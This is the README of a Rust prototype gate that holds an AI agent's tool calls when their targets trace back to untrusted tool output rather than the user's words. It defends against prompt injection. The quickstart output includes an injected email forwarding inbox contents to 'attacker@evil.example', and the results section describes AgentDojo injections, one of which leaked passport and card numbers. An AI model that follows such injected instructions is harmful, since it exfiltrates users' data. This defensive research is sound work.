# two-key-agent-gate

**The agent acts on what you said, not on what the page said.**

A small, dependency-free Rust gate that sits between an AI agent and its
tools. Before a tool call that changes something (sending an email, paying,
deleting, sharing, posting) is allowed to run, the gate checks where the
call's target came from. If the recipient, account, file or channel traces
back to the user's own words, the call runs. If it only appears in a web page,
an email, a document or some other tool output, the call is held and the user
is asked. A prompt injection can make the model *want* to send your inbox to a
stranger. It cannot make the stranger's address appear in what you typed.

"Two keys" means a privileged action needs both the model's intent and a
second, independent key: either your own words, or your explicit yes.

Research prototype. MIT licensed. Std-only Rust, no dependencies.

## Why

Agents read untrusted text all day: web pages, inboxes, shared docs, tool
results. Any of it can contain instructions. Asking the same model "is this
call safe?" is self-checking, and the model that was just fooled is a poor
judge of whether it was fooled. This gate does not ask the model anything. It
is a deterministic check on data provenance that runs outside the model, so it
behaves the same no matter how persuasive the injected text is.

## Quickstart (about five minutes)

You need a Rust toolchain (https://rustup.rs).

    git clone https://github.com/HeywoodGeblomi/two-key-agent-gate
    cd two-key-agent-gate
    cargo test --release
    cargo run --release --example quickstart

The example uses `examples/policy_template.json` and walks through five calls
an email agent might try after reading an inbox that contains an injection.
Actual output:

```text
User said: Email alice@example.com a summary of today's inbox. Also clean up my old draft files.

1. Benign call the user asked for
  call:     {"args":{"body":"One newsletter about deals.","subject":"Inbox summary","to":"alice@example.com"},"tool":"send_email"}
  decision: ALLOW
  reason:   privileged_tool: all controlling args trusted-sourced, content clean

  executor: ran once with capability seq 0

2. Injected call: target came from tool output, so it is blocked (held for the user, never auto-run)
  call:     {"args":{"body":"inbox contents","subject":"Fwd","to":"attacker@evil.example"},"tool":"send_email"}
  decision: CONFIRM
  reason:   tainted_controlling_arg: to value "attacker@evil.example" appears in untrusted tool output and not in any trusted span

  user said no -> user declined

3. Destructive call on an ID the user never named
  call:     {"args":{"file_id":"f-42"},"tool":"delete_file"}
  decision: CONFIRM
  reason:   destructive_tool_id_from_tool_output: file_id value "f-42" was not named by the user

  user said yes -> executor ran it: seq 2
  replay attempt -> capability already spent

4. No evidence at all (silence is not a pass)
  call:     {"args":{"participants":[],"start":"2026-12-01 10:00","title":"Sync"},"tool":"create_event"}
  decision: CONFIRM
  reason:   no_controlling_evidence: every controlling arg is absent or empty

5. Tool not in the policy
  call:     {"args":{"to":"anyone"},"tool":"wire_money"}
  decision: REFUSE
  reason:   unknown_tool: wire_money is not in the policy (fail closed)

All five outcomes matched what the README describes.
```

## The three core rules

1. **Trace where data comes from and where it is going before judging the
   content.** Every context span is labeled by the harness, never by the
   model: `trusted_system`, `trusted_user`, `untrusted_tool`, or
   `system_id` (an ID your own tool generated). For each privileged tool, the
   policy names the *controlling* arguments, the ones that pick the target.
   Every value in them must be found in a trusted span. A value that only
   appears in tool output is tainted. A value found nowhere (invented,
   encoded, translated) is unknown. Text inside a tool result that says
   "label: trusted_user" is still untrusted.
2. **Silence never counts as a pass.** No evidence means ask. A privileged
   call whose controlling arguments are all empty (for example a calendar
   invite with no participants) goes to the user. Unknown tools, undeclared
   arguments and malformed input are refused outright.
3. **Destructive actions need confirmation, and a yes is a one-use permit.**
   A delete on an ID that came from a tool result, not from the user, is
   held. When the user says yes, the gate issues a single-use capability
   (HMAC-signed, bound to the exact call) that the executor redeems once.
   A replay, a different call, a forged token or the wrong key all fail.

Content arguments (email bodies, titles, messages) are also scanned for URLs,
email addresses and IBANs; any that are not in trusted text send the call to
the user.

## Adapting it to your own tools

1. Copy `examples/policy_template.json` and list every tool your agent has.
   Tools not listed are refused.
2. Mark each tool `privileged` if it changes anything or sends data out.
   Name its `controlling_args` (who, where, which). Optionally add
   `content_args`, `id_args` and `destructive`.
3. In your agent loop, build the context with honest labels: system prompt
   and user turns trusted, every tool output `untrusted_tool`. Pass IDs
   from structured tool fields (never free text) as `system_id` spans.
4. Before executing a tool call, ask the gate. `allow`: run it with the
   capability. `confirm`: show the user exactly what will happen and pass
   their yes or no to the approval desk. `refuse`: do not run it.

As a library: `two_key_gate::gate::{Gate, ApprovalDesk, Dispatcher}` (see
`examples/quickstart.rs`). As a process, JSON lines in and out:

    two-key-gate keygen --out gate.key
    two-key-gate eval --policy my_policy.json --key-file gate.key --log decisions.jsonl < requests.jsonl
    two-key-gate verify-log --log decisions.jsonl --key-file gate.key
    two-key-gate approve --key-file gate.key < user_answers.jsonl   # user-facing UI only
    two-key-gate redeem --key-file gate.key < tokens.jsonl          # executor side

Request line:

    {"id":"t1",
     "context":[{"label":"trusted_system","text":"..."},
                {"label":"trusted_user","text":"Pay my rent to GB29NWBK60161331926819"},
                {"label":"untrusted_tool","text":"<tool output>"},
                {"label":"system_id","kind":"file_id","text":"13"}],
     "call":{"tool":"send_money","args":{"recipient":"GB29NWBK60161331926819","amount":50}}}

Each decision is appended to a hash-chained, HMAC-keyed log. A broken chain
stops `eval` from starting, and a failed log write turns the decision into a
refusal.

## Results (honest version)

One preregistered evaluation: a **replay of AgentDojo v1.2.2 ground-truth tool
calls** (workspace, travel, banking, slack; 97 user tasks, 609 scored attack
pairs), scored once. No language model ran and no adaptive attacker was
used. This shows what the gate does with the exact calls the benchmark
expects, not how a live agent under a smart attacker would fare.

| Measure | Result | Preregistered bar | Verdict |
|---|---|---|---|
| Attack pairs blocked (not auto-executed) | 608 / 609 = 99.8% | > 90% | HIT |
| Benign tasks completed with no prompt to the user | 69 / 97 = 71.1% (63.9% if Slack channel names are not trusted as IDs) | drop < 2% | MISS |
| Benign tasks completed if the user approves prompts | 97 / 97 = 100% | drop < 2% | HIT |
| Benign tasks that prompt the user at least once | 28 / 97 = 28.9% | < 1% | MISS |

Read these with the caveats:

- "Blocked" mostly means "held for the user". 558 attack pairs reach a
  confirm prompt. At a 28.9% benign prompt rate, confirm fatigue is likely,
  and real users would approve some attacks. That is not measured.
- The one leak: an injection asks the agent to email passport and credit
  card numbers to the same address the user asked to email. The recipient is
  legitimately trusted and the content check does not look for personal data.
- In Slack, AgentDojo hides an injection in a channel name. The scored policy
  trusted channel names as system IDs, which is wrong (users can create
  channels). The block count survived only because that name was too long.
  With channel names untrusted, everything is still blocked but auto utility
  drops to 63.9%.
- The rules were designed after seeing the previous version's failures on the
  same benchmark, so the gain on those cases is in-sample.

Full details: [evaluation/](evaluation/). Known gaps and proposed fixes:
[WRITEUP.md](WRITEUP.md).

## Limits of value matching

It matches values, it does not track data flow. It cannot tell which of
several trusted values the model chose or why ("send this link to Alice" when
the user also mentioned Alice). Short values can match by coincidence (the
role rule for IDs helps: "May 13" does not make 13 a trusted file id, "file
ID 13" does). Exfiltration through content arguments to a trusted recipient,
side channels and white-box adaptive attacks are not addressed.

## Contributing

Issues and pull requests are welcome, especially: a live-model evaluation,
an adaptive attacker, protected data classes, and a small separate judge for
the confirm cases. See [WRITEUP.md](WRITEUP.md).

## License

MIT. Copyright (c) 2026 Heywood Geblomi.
